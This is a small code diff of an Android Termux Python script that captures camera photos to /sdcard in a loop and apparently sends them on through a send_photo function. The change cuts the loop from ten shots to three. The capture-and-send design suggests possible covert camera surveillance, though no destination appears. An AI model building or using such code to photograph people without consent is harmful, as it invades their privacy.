@@ -19,7 +19,7 @@ def send_photo(photo_path, caption="✔️"):
         print(f"[!] الملف غير موجود: {photo_path}")
 
 def capture_and_send(camera_id, label):
-    for i in range(10):
+    for i in range(3):
         filename = f"/sdcard/{label}_{i+1}.jpg"
         print(f"[+] التقاط {label} {i+1}")
         os.system(f"termux-camera-photo -c {camera_id} {filename}")
